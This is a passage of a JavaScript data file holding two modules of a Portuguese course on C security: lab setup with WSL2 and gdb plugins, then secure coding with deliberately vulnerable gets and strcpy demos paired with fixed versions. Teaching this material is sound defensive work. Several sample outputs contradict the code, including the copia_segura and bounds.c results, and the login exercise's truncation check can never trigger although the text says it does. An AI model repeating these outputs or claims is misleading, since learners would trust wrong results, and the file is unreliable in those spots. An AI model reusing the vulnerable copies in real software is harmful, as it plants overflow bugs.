// Trilha 4 — Cyber (ofensiva + defensiva, uso 100% educacional)
// ATENCAO: todo o conteudo desta trilha deve ser executado APENAS em
// ambiente controlado (WSL2 ou VM isolada). Nunca em maquinas de producao,
// redes de terceiros ou contra sistemas sem autorizacao explicita por escrito.
// Foco: aprendizagem de seguranca (defesa + pesquisa) e escrita segura em C.
module.exports = [
  {
    trilha: '4',
    numero: '01',
    titulo: 'Visão do atacante × defensor e montagem do laboratório',
    subtitulo: 'Mentalidade ofensiva/defensiva + WSL2 ou VM prontos para o resto da trilha',
    objetivo:
      'Entender o que um atacante (e um defensor) procura em código C, conhecer casos reais educacionais de referência e montar um laboratório Linux isolado (WSL2 ou VM) com gcc, gdb, valgrind, pwndbg e peda, criando a pasta labs/ para todos os exercícios da trilha.',
    prerequisitos: 'T0.01 (compilar e rodar no gcc), T0.02 (primeiros passos no gdb)',
    duracao: '~35 min',
    nivel: 'Introdução/Cyber',
    leitura: {
      foco:
        'Use a trilha de intro-ctf do pwn.college (https://pwn.college/) para ver como desafios de pwn funcionam na prática, e o site do Exploit Education (https://exploit.education/) para conhecer os labs Phoenix/Protostar que usaremos nos módulos finais. Ambos são gratuitos, éticos e voltados a aprendizado.',
    },
    secoes: [
      {
        titulo: 'Aviso ético e legal (leia antes de tudo)',
        rotulo: 'regras do laboratório',
        paragrafos: [
          'Esta trilha trabalha com <strong>técnicas ofensivas de baixo nível</strong>: overflow, exploits, shellcode e redes. Isso é <strong>conhecimento necessário para defender</strong> — não existe defesa séria sem entender o ataque. <strong>Regra inegociável:</strong> rode APENAS em ambiente controlado (WSL2/VM isolada), nunca em produção, nunca em rede de terceiros, nunca contra um sistema sem autorização explícita por escrito do proprietário.',
          'Todo exemplo desta trilha é <strong>didático</strong>: binários vulneráveis criados por você, para você, dentro de um diretório <code>labs/</code>. Não há malware real, exfiltração nem C2 real em nenhum bloco. Você vai gerar <em>mini-exploits</em> acadêmicos — os mesmos que as equipes de segurança (red team) e os pesquisadores (defesa) produzem nos seus estudos.',
          'Ao terminar os exercícios, <strong>destrua ou isole</strong> os binários de exploração do seu sistema principal. Manter artefatos de exploit soltos por aí é má prática.',
        ],
      },
      {
        titulo: 'Duas visões, um mesmo código',
        paragrafos: [
          'A segurança de um software não é uma propriedade que se adiciona no final: ela nasce da forma como o programador trata <strong>entrada</strong>, <strong>memória</strong> e <strong>confiança</strong>. Veja o que cada lado enxerga no mesmo programa C:',
        ],
        lista: [
          '<strong>Entrada não validada</strong> — o atacante procura a primeira linha que lê dado externo sem checar tamanho/conteúdo: <code>gets</code>, <code>strcpy</code>, <code>scanf("%s")</code>, <code>printf(dado)</code>. O defensor procura exatamente os mesmos pontos para substituí-los por versões limitadas.',
          '<strong>Memória</strong> — o atacante procura onde uma escrita pode estourar um buffer, corromper um ponteiro ou um endereço de retorno. O defensor procura as mesmas escritas para impor limites, canários e sanitização.',
          '<strong>Confiança</strong> — o atacante procura o que o programa assume sobre o ambiente (variável de ambiente, banco de dados, arquivo de config, timeout). O defensor procura o que pode ser falsificado ou manipulado.',
          '<strong>Superfícies de ataque</strong> — o atacante mapeia tudo que recebe bytes de fora; o defensor reduz esse mapa ao mínimo (menos entrada, menos privilégio, menos código exposto).',
        ],
      },
      {
        titulo: 'Estudos de caso (contexto educacional)',
        paragrafos: [
          'Conhecer falhas reais ajuda a entender por que esta trilha existe. Todos os casos abaixo são <strong>históricos e documentados</strong> — estudá-los é pesquisa acadêmica, não reprodução.',
        ],
        lista: [
          '<strong>Morris Worm (1988)</strong> — um dos primeiros worms da internet explorou, entre outras falhas, um <em>buffer overflow</em> no <code>fingerd</code> (um serviço escrito em C que usava <code>gets</code>). O worm se propagou sozinho e derrubou grandes redes: um lembrete antigo de que <em>uma única cópia sem limite de tamanho</em> já era um problema em 1988.',
          '<strong>Heartbleed (2014, CVE-2014-0160)</strong> — falha de <em>bounds check</em> na extensão heartbeat do OpenSSL (em C): o servidor copiava <code>n</code> bytes de um buffer sem conferir que existiam <code>n</code> bytes disponíveis, vazando memória do processo (incluindo chaves privadas). A lição: <em>cheque o tamanho do dado contra o tamanho do alvo</em> (bounds checking), nunca confie em um tamanho declarado pela entrada.',
          '<strong>EternalBlue (2017)</strong> — falha em <code>srv.sys</code> do Windows (SMBv1, escrito em C) permitia escrever além do buffer no <em>kernel</em>. Combinado ao worm <strong>WannaCry</strong>, causou um dos maiores ataques de ransomware da história. Lição: exploração não é só brinquedo de aplicação — bugs de memória existem em nível de kernel.',
          '<strong>Log4Shell (2021, CVE-2021-44228)</strong> — não é C (é Java/Log4j), mas mostra a versão moderna da mesma ideia: <em>entrada não validada interpretada como código/conteúdo executável</em>. O padrão mental "dado externo misturado com interpretação" é universal.',
        ],
      },
      {
        titulo: 'Por que C ainda é central em cibersegurança',
        paragrafos: [
          'Décadas depois, a maioria das vulnerabilidades sérias de memória (<em>memory safety</em>) vive em código C/C++: kernels, drivers, browsers, bibliotecas TLS/cripto, firmware de roteadores e sistemas embarcados. C domina justamente onde o hardware está perto: <strong>exploits, shellcode, análise de malware e engenharia reversa exigem C e assembly na veia</strong>.',
          'A consequência prática para o curso: quem domina C entende (1) <em>por que</em> o bug existe, (2) <em>como</em> ele é explorável, (3) <em>qual correção</em> elimina a classe inteira, e (4) como ler relatórios (CVE, CWE, CVSS) sem panacéias. Ferramentas de scanner ajudam, mas a decisão final é humana.',
        ],
      },
      {
        titulo: 'Montando o laboratório com WSL2 + Ubuntu (recomendado)',
        rotulo: 'setup minimo do lab',
        paragrafos: [
          'No Windows, a maneira mais simples é o <strong>WSL2</strong> com Ubuntu — você ganha um Linux real (kernel próprio) com terminal integrado. Passo a passo:',
        ],
        lista: [
          'Abra o PowerShell como administrador e rode <code>wsl --install</code> (instala WSL2 + Ubuntu por padrão) e reinicie quando pedir.',
          'Crie usuário/senha linux ao primeiro boot. Depois atualize: <code>sudo apt update && sudo apt upgrade -y</code>.',
          'Instale as ferramentas: <code>sudo apt install -y build-essential gcc gdb valgrind python3 netcat-openbsd tcpdump</code> (build-essential traz gcc, make e libc).',
          '<em>(Opcional, recomendado para os módulos 4 a 7)</em> Instale o pwndbg: <code>git clone https://github.com/pwndbg/pwndbg</code>, entre na pasta e rode <code>./setup.sh</code>. Ele vira o gdb padrão com visualização de pilha e registradores.',
          '<em>(Alternativa)</em> Instale o peda (já é um script único): <code>git clone https://github.com/longld/peda</code>, depois adicione <code>source ~/peda/peda.py</code> no final do seu <code>~/.gdbinit</code>.',
          'Crie a pasta de trabalho: <code>mkdir -p ~/labs/4.{01..10}</code> — um diretório por módulo. Os comandos desta trilha assumem que você está dentro de <code>~/labs</code>.',
        ],
      },
      {
        titulo: 'Alternativa: máquina virtual isolada',
        paragrafos: [
          'Se preferir um isolamento mais forte que o WSL2 (ou não puder instalar o WSL), use uma VM:',
        ],
        lista: [
          '<strong>VirtualBox</strong> (gratuito) + imagem <strong>Debian</strong> ou <strong>Kali</strong>. Kali já traz gdb, pwndbg, metasploit e ferramentas; Debian é mais enxuta e suficiente para esta trilha.',
          'Configure a rede da VM como <strong>NAT ou rede interna</strong> — nunca "bridge" em rede de produção/terceiros. A VM deve estar isolada do resto da rede.',
          'Instale as mesmas ferramentas da lista do WSL2 dentro da VM.',
          'Vantagem extra da VM: <em>snapshots</em>. Tire um snapshot "limpo" antes de cada sessão de exploração e restaure depois — seu sistema base nunca é tocado.',
        ],
      },
      {
        titulo: 'Teste rápido do ambiente',
        rotulo: 'hello.c no Linux',
        paragrafos: [
          'Crie o programa abaixo dentro do WSL/VM e compile com o gcc do Linux. Se isto rodar, seu laboratório está pronto para o módulo 02. Este arquivo compila também no Windows/MinGW, mas esta trilha inteira assume o Linux.',
        ],
        codigo: `#include <stdio.h>

int main(void)
{
    printf("Lab pronto: %d cores logicos\\n", 1);
    printf("Este eh um Linux real, exigido pela trilha Cyber\\n");
    return 0;
}`,
        saida: `$ gcc -Wall -Wextra -std=c11 hello_lab.c -o hello_lab
$ ./hello_lab
Lab pronto: 1 cores logicos
Este eh um Linux real, exigido pela trilha Cyber`,
      },
      {
        titulo: 'Conferência do ambiente',
        rotulo: 'verificando as ferramentas',
        codigo: `$ uname -a
$ gcc --version
$ gdb --version
$ valgrind --version
$ mkdir -p ~/labs && ls -ld ~/labs`,
        saida: `Linux DESKTOP-XXXX 5.15.xxx-microsoft-standard-WSL2 ...
gcc (Ubuntu 13.2.0-6ubuntu2) 13.2.0
GNU gdb (Ubuntu 13.2) ...
valgrind-3.19.0
drwxr-xr-x 2 voce voce 4096 ... labs`,
      },
      {
        titulo: 'Regras de ouro para o resto da trilha',
        lista: [
          'Rode APENAS em WSL2/VM controlada; nunca em produção — repita este mantra em cada módulo.',
          'Os binários vulneráveis da trilha ficam somente em <code>~/labs</code>. Não os copie para o sistema principal.',
          'Desligue ASLR e use flags especiais de compilação SOMENTE durante o estudo, por sessão, e restaure ao final (veremos o comando exato no módulo 05).',
          'Antes de explorar qualquer coisa, leia o código-fonte completo e escreva o que espera que aconteça. Exploração às cegas não é ciência.',
          'Nenhum exercício requer contato com sistemas externos. Se algo pedir acesso a outra máquina, pare e revise: não é este material.',
        ],
      },
    ],
    exercicios: [
      {
        nivel: 1,
        enunciado:
          'Instale o WSL2 + Ubuntu (ou prepare uma VM com Debian/Kali), atualize o sistema e instale build-essential, gcc, gdb e valgrind. Rode <code>uname -a</code>, <code>gcc --version</code> e <code>valgrind --version</code> e confira que os três respondem.',
        dica: 'Tudo isso é feito no terminal Linux. No WSL, use <code>sudo apt install -y build-essential gcc gdb valgrind python3</code>.',
        solucao: `$ uname -a
Linux NC-DESKTOP 5.15.xxx-microsoft-standard-WSL2 #1 SMP ... x86_64 GNU/Linux
$ gcc --version
gcc (Ubuntu 13.2.0-6ubuntu2) 13.2.0
$ valgrind --version
valgrind-3.19.0`,
        solucao_obs: 'Se <code>gcc</code> não aparecer, rode <code>sudo apt install -y build-essential</code>. A versão exata não importa — precisa existir.',
      },
      {
        nivel: 1,
        enunciado:
          'Crie a estrutura de pastas <code>~/labs/4.01</code> até <code>~/labs/4.10</code> com um único comando e confirme com <code>ls</code>. Dentro de <code>~/labs/4.01</code> coloque o <code>hello_lab.c</code> desta seção, compile com <code>-Wall -Wextra</code> e rode.',
        dica: 'Use <code>mkdir -p ~/labs/4.{01..10}</code> (expansão de chaves do bash).',
        solucao: `$ mkdir -p ~/labs/4.{01..10}
$ ls ~/labs
4.01  4.02  4.03  4.04  4.05  4.06  4.07  4.08  4.09  4.10
$ cd ~/labs/4.01
$ gcc -Wall -Wextra -std=c11 hello_lab.c -o hello_lab
$ ./hello_lab`,
      },
      {
        nivel: 2,
        enunciado:
          'Instale o peda (com o comando da seção) e confira que ele carrega: rode <code>gdb ./seu_programa</code> e dentro do gdb o prompt deve passar a mostrar as linhas de "PEDA". Depois digite <code>quit</code>.',
        dica: 'Se o peda não carregar, verifique se a linha <code>source ~/peda/peda.py</code> está no fim do <code>~/.gdbinit</code> e se o arquivo <code>peda.py</code> existe.',
        solucao: `$ git clone https://github.com/longld/peda ~/peda
$ echo "source ~/peda/peda.py" >> ~/.gdbinit
$ gdb ./hello_lab
gdb-peda$ quit`,
        solucao_obs: 'A partir do módulo 04 usaremos peda/pwndbg diariamente para visualizar pilha e registradores.',
      },
    ],
    quiz: [
      {
        pergunta: 'Qual falha o Morris Worm de 1988 explorou e por que o caso é lembrado até hoje?',
        opcoes: [
          'Um overflow no fingerd (função gets) que permitiu propagação automática em rede',
          'Uma falha de criptografia no HTTPS',
          'Um erro de configuração de senha no Linux',
          'Uma vulnerabilidade de Java no servidor web',
        ],
        correta: 0,
        explicacao: 'O Morris Worm explorou, entre outras, o overflow no fingerd (which usava gets) e se propagou sozinho, derrubando redes inteiras.',
      },
      {
        pergunta: 'A falha Heartbleed (2014) pertence a qual classe de bug?',
        opcoes: [
          'Erro de bounds checking (não verificava se n bytes realmente existiam antes de copiá-los)',
          'Format string no OpenSSL',
          'Uso de gets em um serviço de e-mail',
          'Senha padrão hardcoded',
        ],
        correta: 0,
        explicacao: 'Heartbleed copiava n bytes de memória sem confirmar que existiam n bytes disponíveis — a lição central do bounds checking.',
      },
      {
        pergunta: 'Onde a trilha Cyber deve ser executada, segundo a regra de ouro?',
        opcoes: [
          'Em qualquer máquina, inclusive produção, se for "só um teste rápido"',
          'Apenas em ambiente controlado (WSL2 ou VM isolada), nunca em produção',
          'Apenas em servidores Windows do trabalho',
          'Em qualquer máquina, desde que se apague o histórico depois',
        ],
        correta: 1,
        explicacao: 'Todo pentest/exploração exige autorização e isolamento; este curso roda somente em lab próprio.',
      },
      {
        pergunta: 'Quais ferramentas formam o laboratório mínimo desta trilha?',
        opcoes: [
          'gcc, gdb, valgrind e python3 (além de peda/pwndbg recomendados)',
          'Excel, Word e PowerPoint',
          'Apenas o navegador Edge',
          'Visual Studio e .NET Framework',
        ],
        correta: 0,
        explicacao: 'O lab usa gcc (compilar), gdb (depurar), valgrind (memória), python3 (gerar payloads) e opcionalmente o peda/pwndbg.',
      },
    ],
    projeto: {
      titulo: 'Laboratório completo da trilha Cyber',
      descricao:
        'Deixe o laboratório pronto para os módulos 02–10: WSL2 ou VM atualizada, gcc/gdb/valgrind/python3 instalados, peda E pwndbg (ou só um deles, mas configurado), pastas ~/labs/4.01..4.10 criadas, e um ~/notas_gdb.txt com os comandos essenciais do gdb que você já conhece da Trilha 0. Dentro de cada pasta labs/4.XX crie um README.md de uma linha descrevendo o que será estudado ali (pode escrever depois, conforme avança).',
      criterios: [
        '<code>uname -a</code>, <code>gcc --version</code>, <code>gdb --version</code> e <code>valgrind --version</code> respondem no terminal Linux.',
        '<code>~/labs/4.01</code>…<code>4.10</code> existem e a seção 4.01 contém o hello_lab compilado e rodando.',
        'peda OU pwndbg carregam no gdb sem erro.',
        'Você consegue abrir o gdb, carregar um binário, dar break, run e sair.',
      ],
    },
  },
  {
    trilha: '4',
    numero: '02',
    titulo: 'Codificação segura em C (defensiva)',
    subtitulo: 'Funções perigosas, bounds checking e compilação defensiva',
    objetivo:
      'Aprender a escrever C à prova de entrada hostil: substituir gets/strcpy/strcat/sprintf e scanf("%s") por variantes com limite, implementar bounds checking explícito, conhecer TOCTOU, e blindar a build com flags (-fstack-protector, -D_FORTIFY_SOURCE, -Wformat-security) e sanitizers (ASan/UBSan) e valgrind.',
    prerequisitos: 'T0.01 (gcc), T2.05 (strings e ponteiros)',
    duracao: '~1h',
    nivel: 'Intermediário/Cyber',
    leitura: {
      foco:
        'Consulte a página da OWASP sobre Buffer Overflow (https://owasp.org/www-community/vulnerabilities/Buffer_Overflow) e as entradas CWE-120 (buffer copy sem checagem), CWE-121 (stack-based overflow) e CWE-119 (falha de limites de memória) em https://cwe.mitre.org/ — as CWEs são o vocabulário que usamos para classificar bugs nesta trilha.',
    },
    secoes: [
      {
        titulo: 'A regra de ouro da entrada de dados',
        paragrafos: [
          'A regra de ouro da codificação segura em C é curta: <strong>nenhuma operação de memória pode assumir que a entrada cabe no alvo</strong>. Sempre que copiar, concatenar ou formatar dados vindos de fora, o programador deve dizer <em>quantos bytes o destino aguenta</em>. Este módulo ensina as três trocas que resolvem 80% dos problemas triviais:',
        ],
        lista: [
          '<code>gets</code> → <code>fgets</code> (com tamanho máximo).',
          '<code>strcpy/strcat/sprintf</code> → versões com limite de destino (<code>snprintf</code>, <code>strncpy</code> com cuidado no NUL, ou cópia manual com tamanho).',
          '<code>scanf("%s", …)</code> → <code>fgets</code> que lê a linha inteira de uma vez.',
        ],
      },
      {
        titulo: 'Caso 1: gets (removida do padrão C11)',
        rotulo: 'gets_demo.c (VULNERÁVEL)',
        paragrafos: [
          '<code>gets</code> lê do teclado sem nenhum limite e <strong>foi removida do padrão C11</strong> (por isso muitos compiladores emitem um aviso forte). Qualquer linha mais longa que o buffer estoura a pilha. Este exemplo é didático: compile-o no Linux/WSL apenas para ver o aviso do gcc e o comportamento estourado.',
        ],
        codigo: `/* gets_demo.c -- compila com WARNING no Linux.
   gcc -Wall -Wextra -std=c11 gets_demo.c -o gets_demo   (Linux/WSL) */
#include <stdio.h>

int main(void)
{
    char nome[8];
    printf("Seu nome: ");
    gets(nome);          /* sem limite: estoura nome */
    printf("Ola, %s!\\n", nome);
    return 0;
}`,
        saida: `$ gcc -Wall -Wextra -std=c11 gets_demo.c -o gets_demo
gets_demo.c: In function 'main':
warning: implicit declaration of function 'gets' ...
warning: cast between incompatible function types ...
$ ./gets_demo
Seu nome: miguel
Ola, miguel!`,
      },
      {
        titulo: 'A versão corrigida com fgets',
        rotulo: 'gets_fixed.c (SEGURO)',
        paragrafos: [
          '<code>fgets(ptr, tamanho, stdin)</code> lê <em>no máximo tamanho-1 caracteres</em> e sempre grava o <code>\\0</code> no final — é a substituição direta do <code>gets</code>. <code>tamanho</code> aqui é o tamanho total do buffer (8 no nosso caso), não "8-1"; o <code>fgets</code> nunca ultrapassa o alvo.',
        ],
        codigo: `/* gets_fixed.c -- versao segura com fgets.
   gcc -Wall -Wextra -std=c11 gets_fixed.c -o gets_fixed   (compila em qualquer SO) */
#include <stdio.h>

int main(void)
{
    char nome[8];
    printf("Seu nome: ");
    if (fgets(nome, sizeof nome, stdin) == NULL) {
        return 1;
    }
    printf("Ola, %s", nome);
    return 0;
}`,
        saida: `$ ./gets_fixed
Seu nome: miguel
Ola, miguel`,
      },
      {
        titulo: 'Caso 2: strcpy/strcat/sprintf e a família com limite',
        rotulo: 'copia_perigosa.c (VULNERÁVEL)',
        paragrafos: [
          'As três cópias clássicas não recebem o tamanho do destino:',
        ],
        lista: [
          '<code>strcpy(dest, src)</code> — copia até o <code>\\0</code> de src; estoura se src for maior que dest.',
          '<code>strcat(dest, src)</code> — igual, mas <em>anexa</em> após o <code>\\0</code> atual de dest; o destino precisa de espaço para o que já tem + o que entra.',
          '<code>sprintf(dest, fmt, …)</code> — formata produzindo uma string; o destino precisa conter o texto formatado.',
        ],
        codigo: `/* copia_perigosa.c -- demonstra estouro silencioso (VULNERAVEL).
   gcc -Wall -Wextra -std=c11 copia_perigosa.c -o copia_perigosa
   Rode no Linux/WSL com ASAN se quiser ver o estouro gritar:
   gcc -fsanitize=address copia_perigosa.c -o copia_perigosa_asan
   (o pacote libasan precisa estar instalado: sudo apt install gcc) */
#include <stdio.h>
#include <string.h>

int main(void)
{
    char destino[10];
    char atacante[64];

    memcpy(atacante, "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ", 37);
    atacante[37] = '\\0';

    /* destino[10] NAO consegue segurar 37 bytes: estoura a pilha */
    strcpy(destino, atacante);

    printf("destino = %s\\n", destino);
    return 0;
}`,
        saida: `$ gcc -Wall -Wextra -std=c11 copia_perigosa.c -o copia_perigosa
copia_perigosa.c: In function 'main':
warning: 'strcpy' writing 37 bytes into a region of size 10 ...
$ ./copia_perigosa_asan
==12345==ERROR: AddressSanitizer: stack-buffer-overflow ...`,
      },
      {
        titulo: 'A versão corrigida com limite explícito',
        rotulo: 'copia_segura.c (SEGURO)',
        paragrafos: [
          'A substituição direta é <code>strncpy(dest, src, n)</code> — mas atenção: <code>strncpy</code> <strong>não garante o <code>\\0</code> final</strong> se src tiver >= n bytes; por isso o padrão defensivo é <code>strncpy(dest, src, n-1); dest[n-1] = 0;</code>. Para formatação, use <code>snprintf(dest, n, fmt, …)</code>, que grava <code>\\0</code> sempre.',
        ],
        codigo: `/* copia_segura.c -- com limpeza e padrao defensivo.
   gcc -Wall -Wextra -std=c11 copia_segura.c -o copia_segura  (qualquer SO) */
#include <stdio.h>
#include <string.h>

#define BUFSZ 32

static void copiar_segura(char *dest, size_t n, const char *src)
{
    if (n == 0) return;
    strncpy(dest, src, n - 1);   /* copia no maximo n-1 */
    dest[n - 1] = '\\0';          /* garante terminacao */
}

int main(void)
{
    char destino[BUFSZ];
    char entrada[256];
    char atacante[64];

    memcpy(atacante, "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ", 37);
    atacante[37] = '\\0';

    copiar_segura(destino, sizeof destino, atacante);
    puts("Copiado com limite:");
    puts(destino);
    return 0;
}`,
        saida: `$ ./copia_segura
Copiado com limite:
0123456789ABCDEFGHIJ`,
      },
      {
        titulo: 'Caso 3: scanf("%s") e a versão com fgets',
        rotulo: 'scanf_vs_fgets.c',
        paragrafos: [
          '<code>scanf("%s", buf)</code> não tem limite e ainda quebra em espaços. A alternativa robusta: ler a linha inteira com <code>fgets</code> e fazer parsing depois com <code>sscanf</code>/manipulação manual (com o buffer já limitado).',
        ],
        codigo: `/* scanf_vs_fgets.c -- maneiras de ler uma palavra com limite.
   gcc -Wall -Wextra -std=c11 scanf_vs_fgets.c -o scanf_vs_fgets */
#include <stdio.h>
#include <string.h>

int main(void)
{
    char palavra[16];

    /* MAU: sem limite, estoura se a palavra passar de 15 chars */
    /* scanf("%s", palavra); */

    /* BOM: fgets limita, mas guarda o \\n no final */
    printf("Digite uma palavra: ");
    if (fgets(palavra, sizeof palavra, stdin) == NULL) return 1;
    palavra[strcspn(palavra, "\\n")] = '\\0';   /* remove o \\n final */

    printf("Voce digitou: %s\\n", palavra);
    return 0;
}`,
        saida: `$ ./scanf_vs_fgets
Digite uma palavra: senha123
Voce digitou: senha123`,
      },
      {
        titulo: 'Bounds checking: o contrato é o tamanho do alvo',
        paragrafos: [
          'Bounds checking = <strong>o código pergunta ao destinatário quantos bytes ele aguenta</strong> antes de qualquer cópia. Quando você escreve funções que recebem buffers (cópia, concatenação, formatação), exija o tamanho como parâmetro e valide na entrada:',
        ],
        rotulo: 'bounds.c (funcao com tamanho)',
        codigo: `/* bounds.c -- una funcao segura recebe (destino, tamanho, fonte).
   gcc -Wall -Wextra -std=c11 bounds.c -o bounds  (qualquer SO) */
#include <stdio.h>
#include <string.h>

static size_t concat_seguro(char *dest, size_t n, const char *src)
{
    size_t ja = strnlen(dest, n);      /* quanto ja ha no destino */
    if (ja >= n) return n;             /* destino cheio */
    size_t cabem = n - ja - 1;         /* espaco livre (menos o NUL) */
    strncpy(dest + ja, src, cabem);
    dest[n - 1] = '\\0';
    return strnlen(dest, n);
}

int main(void)
{
    char log[32] = "inicio: ";
    concat_seguro(log, sizeof log, "usuario=miguel, acao=login, ok");
    puts(log);
    return 0;
}`,
        saida: `$ ./bounds
inicio: usuario=miguel, acao=log`,
      },
      {
        titulo: 'TOCTOU (menção)',
        paragrafos: [
          '<strong>TOCTOU</strong> (Time-Of-Check To Time-Of-Use) é a classe de bug em que o programa verifica uma condição (ex.: <code>access(caminho, W_OK)</code>), e <em>entre a verificação e o uso</em> o estado muda (ex.: um atacante troca o arquivo por um symlink). Em C, envolve chamadas de sistema atômicas (<code>open</code> com flags corretas) em vez de checar e depois abrir. Lembre-se apenas do nome e do padrão por enquanto — você vai reconhecê-lo na vida real quando vir "chequei, depois usei, sem atomicidade".',
        ],
      },
      {
        titulo: 'Compilação defensiva: flags que ajudam',
        rotulo: 'flags defensivas',
        paragrafos: [
          'O gcc tem proteções que o programador liga <strong>uma vez, na build</strong>. Custo do desenvolvimento no estudo: zero. Em produção: mitigações reais.',
        ],
        lista: [
          '<code>-fstack-protector-all</code> — injeta <em>canários de pilha</em> (valor aleatório perto do return address); se o overflow destruir o canário, o programa aborta automaticamente.',
          '<code>-D_FORTIFY_SOURCE=2</code> — enriquece funções conhecidas (strcpy, sprintf, memcpy) com checagens de tamanho EM TEMPO DE EXECUÇÃO quando o compilador conhece o tamanho do alvo; precisa ser combinado com <code>-O1</code> ou superior.',
          '<code>-Wformat -Wformat-security -Werror=format-security</code> — transforma em <em>erro</em> o uso de format string com entrada do usuário (o bug do módulo 07).',
          '<code>-fno-stack-protector</code> — é a flag de <strong>desativação</strong>; NÃO a use em código real. Só nos módulos de exploração didática (05-07).',
        ],
        codigo: `# build defensiva recomendada para o codigo REAL (Linux e/ou MinGW):
gcc -O2 -Wall -Wextra -Wformat -Wformat-security -Werror=format-security \
    -fstack-protector-all -D_FORTIFY_SOURCE=2 -o app app.c`,
      },
      {
        titulo: 'Sanitizers (runtime) e valgrind',
        rotulo: 'asan ubasan e valgrind',
        paragrafos: [
          'A compilação defensiva evita, mas o <strong>sanitizer</strong> flagra. O ASan (Address Sanitizer) reescreve seu programa para detectar overflow/use-after-free em tempo de execução; o UBSan faz o mesmo para comportamento indefinido (unsigned wrap está fora, mas nan/invalid, overflow signed etc. entram). Valgrind simula a CPU e caça vazamentos e acessos inválidos sem recompilar.',
        ],
        lista: [
          '<strong>ASan:</strong> <code>gcc -fsanitize=address -g demo.c -o demo</code>. Precisa do <code>libasan</code> — no Ubuntu, instalado junto com o gcc; no MinGW do Windows <em>não está disponível</em>. Use WSL. Ao rodar, a primeira escrita fora do buffer para o programa com um relatório detalhado.',
          '<strong>UBSan:</strong> <code>gcc -fsanitize=undefined -g demo.c -o demo</code>. Acusa divisão por zero, estouro de int com sinal, etc.',
          '<strong>Valgrind:</strong> <code>valgrind --leak-check=full ./demo</code>. Roda o binário normal sem recompilar; reporta leaks e <em>invalid read/write</em>. Mais lento que ASan, mas não exige flags novas.',
          'No CI (integração contínua) de um projeto real, compile SEMPRE com um sanitizer em uma das jobs — é o teste de regressão de memória mais barato que existe.',
        ],
        codigo: `# observando um overflow com ASan (Linux/WSL; precisa do libasan)
gcc -Wall -g -fsanitize=address copia_perigosa.c -o copia_perigosa_asan
./copia_perigosa_asan`,
        saida: `==14725==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fff...
    #0 0x... in main copia_perigosa.c:11
  ...
  The signal is caused by a WRITE memory access.
  SUMMARY: AddressSanitizer: stack-buffer-overflow ...`,
      },
      {
        titulo: 'Como se defender',
        lista: [
          'Nunca use <code>gets</code>, <code>strcpy</code>, <code>strcat</code>, <code>sprintf</code> ou <code>scanf("%s", …)</code> sem limite — use <code>fgets</code> e <code>snprintf</code>, ou suas próprias funções com tamanho do destino.',
          'Todo buffer recebe <strong>tamanho de alvo</strong> nas funções que você escrever; um <code>char *buf</code> sem <code>size_t n</code> ao lado é um bilhete de estouro.',
          'Trate toda entrada como hostil: tamanho baseado em <code>sizeof</code>/parâmetro, nunca em um comprimento declarado pelo remetente.',
          'Compile com o combo defensivo (<code>-fstack-protector-all -D_FORTIFY_SOURCE=2 -Wformat-security -Werror=format-security</code>).',
          'Rode ASan (WSL) ou valgrind em testes; ambos transformam "estourou silenciosamente" em "parou com endereço e pilha de chamadas".',
          'Lide com o return value das chamadas de I/O (<code>NULL</code> do <code>fgets</code>) — entrada truncada ainda é entrada válida.',
          'Empacote as regras no seu time: code review tem checklist mínimo (procure gets/strcpy/sprintf na busca de texto do repositório).',
        ],
      },
    ],
    exercicios: [
      {
        nivel: 1,
        enunciado:
          'Escreva <code>login.c</code> que pergunta uma senha com <code>fgets</code> num buffer de 16 bytes e imprime quantos caracteres foram digitados (com <code>strlen</code>) e se a senha está totalmente contida no buffer <em>hint: compare strlen com o espaço disponível</em>. Depois teste digitando uma linha de 40 caracteres: o programa NÃO deve estourar e deve imprimir o tamanho truncado.',
        dica: 'Use <code>fgets(pass, sizeof pass, stdin)</code>; depois remova o <code>\\n</code> com <code>pass[strcspn(pass, "\\n")] = 0</code>.',
        solucao: `#include <stdio.h>
#include <string.h>

int main(void)
{
    char pass[16];
    printf("Senha: ");
    if (fgets(pass, sizeof pass, stdin) == NULL) return 1;
    pass[strcspn(pass, "\\n")] = '\\0';
    printf("Recebi %zu caracteres\\n", strlen(pass));
    if (strlen(pass) >= sizeof pass) {
        printf("Atencao: entrada truncada\\n");
    }
    return 0;
}`,
        solucao_obs: 'Com 40 caracteres, <code>fgets</code> guarda apenas os primeiros 15 + NUL; <code>strlen</code> retorna 15 e o aviso dispara.',
      },
      {
        nivel: 2,
        enunciado:
          'Crie <code>concat.c</code> com uma função <code>concat_seguro</code> (como na seção de bounds) e monte a mensagem "erro na linha 7" a partir de duas strings, garantindo que nunca estoure um buffer de 20 bytes. Mostre com uma entrada longa que o resultado é truncado, não corrompido.',
        dica: 'Use <code>snprintf(dest, n, "%s%s", a, b)</code> — mais simples e sempre termina com NUL.',
        solucao: `#include <stdio.h>

int main(void)
{
    char msg[20];
    const char *pre = "erro na linha ";
    snprintf(msg, sizeof msg, "%s%s", pre, "7");
    puts(msg);

    /* entrada hostil longa: truncada, nunca estoura */
    snprintf(msg, sizeof msg, "%s%s",
             pre, "123456789012345678901234567890");
    puts(msg);
    return 0;
}`,
        solucao_obs: 'Note que <code>snprintf</code> retorna o tamanho que <em>seria</em> escrito — útil para detectar truncamento (float no buffer).',
      },
      {
        nivel: 2,
        enunciado:
          'Compile <code>copia_perigosa.c</code> com <code>-fsanitize=address</code> no WSL e rode. Leia o relatório do ASan: identifique a linha do estouro e o endereço. Depois recompile a versão segura e confirme que o ASan fica quieto.',
        dica: 'Procure no relatório o texto "stack-buffer-overflow" e a linha com <code>copia_perigosa.c:N</code>.',
        solucao: `$ gcc -Wall -g -fsanitize=address copia_perigosa.c -o copia_perigosa_asan
$ ./copia_perigosa_asan
==14725==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x...
    #0 0x... in main copia_perigosa.c:11
SUMMARY: AddressSanitizer: stack-buffer-overflow`,
        solucao_obs: 'Para a mesma detecção sem recompilar, rode <code>valgrind ./copia_perigosa</code> — ele acusa "Invalid write of size N".',
      },
    ],
    quiz: [
      {
        pergunta: 'Qual a maneira correta de ler uma string com limite em C?',
        opcoes: [
          'fgets(nome, sizeof nome, stdin)',
          'scanf("%s", nome)',
          'gets(nome)',
          'strcpy(nome, stdin)',
        ],
        correta: 0,
        explicacao: 'fgets recebe o tamanho do buffer e grava o NUL; scanf "%s" e gets não têm limite.',
      },
      {
        pergunta: 'O que a flag -fstack-protector-all faz?',
        opcoes: [
